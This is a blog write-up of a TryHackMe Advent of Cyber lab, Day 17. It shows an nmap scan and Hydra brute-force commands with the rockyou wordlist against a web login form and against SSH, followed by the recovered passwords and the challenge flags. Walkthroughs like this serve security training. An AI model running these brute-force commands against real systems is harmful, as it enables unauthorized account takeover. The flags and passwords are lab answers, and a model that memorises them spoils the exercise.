---
title: "Advent of Cyber Day 17 Hydra-ha-ha-haa"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 17 Hydra-ha-ha-haa"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!

Use Hydra to brute force Elf Molly's password. Use the rockyou.txt password list, which can be found [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).

Supporting materials can be found [here](https://blog.tryhackme.com/hydra/).

**This machine will take between 3-4 minutes to boot.**

### Setup

```bash
nmap -A -vv 10.10.19.144
```

```bash
22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 87:da:af:c1:ff:c5:03:11:54:80:41:d4:82:8a:99:d7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHO4ktM9/27P2QGFraBKPJS3H+OXCHRWwn2XlNF47So47uW/XhvJOBdKpGSGfd5xsBLUerN7O3YCbwYmvggkas6D4GN0lrtyJacdk1wGViCBZwVd/j1lf3EVmRpO8ZMLOgEo9ew8hkG5P6S+P4xnW8FG7aEcRO6EF1Mq64r+GG2VK/wE6IwbPBs6ILG/SC4FGPy1rSNvDNRPgUouMeQqFjTXNEX0cWv8JFsfNogreS05wAOzjyne3d2Ow7RyvSm10zP9GWUXRYmkpspSSGruAZ8STLH8G0l3Z1kaQSNl5tqtMAhONnsuMh18MZCZxOpUfiD7cT20/ZEF8lD9eYSV/h
|   256 2d:04:f7:b2:22:74:9a:32:a6:66:f8:50:0c:5c:c5:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHB+zsySVDiAxyh1OOC6IbA0FryCdBCXKOwBoqoLDkHC9+RA+8rwI4TVTrMuFsw77IKz67tgN56q8fO4BhVBMEU=
|   256 87:2c:2e:a9:2c:28:a2:6c:b5:96:ff:58:cb:15:45:b6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEW/CLFOcCBY09DHMT3eByXDXR1IysHYF2ecZVVf9PEt

80/tcp open http syn-ack Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Christmas Challenge
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![https://imgur.com/6d5GxKt.png](https://imgur.com/6d5GxKt.png)

[Hydra - Brute Force HTTP(S)](https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/)

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.19.144 http-post-form "/login:username=^USER^&password=^PASS^&Login=Login:Your username or password is incorrect." -v
```

```bash
[80][http-post-form] host: 10.10.19.144   login: "molly"   password: "joyness1994"
```

### #1 Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

![https://imgur.com/yynj6n6.png](https://imgur.com/yynj6n6.png)

```bash
"THM{2673a7dd116de68e85c48ec0b1f2612e}"
```

### #2 Use Hydra to bruteforce molly's SSH password. What is flag 2?

```bash
kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.19.144

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-08 18:32:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.19.144:22/

[22][ssh] host: 10.10.19.144   login: "molly"   password: "butterfly"
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-08 18:32:10
```

```bash
ssh molly@10.10.19.144
password: "butterfly"
```

```bash
molly@ip-10-10-19-144:~$ ls
flag2.txt
molly@ip-10-10-19-144:~$ cat flag2.txt
"THM{c8eeb0468febbadea859baeb33b2541b}"
```
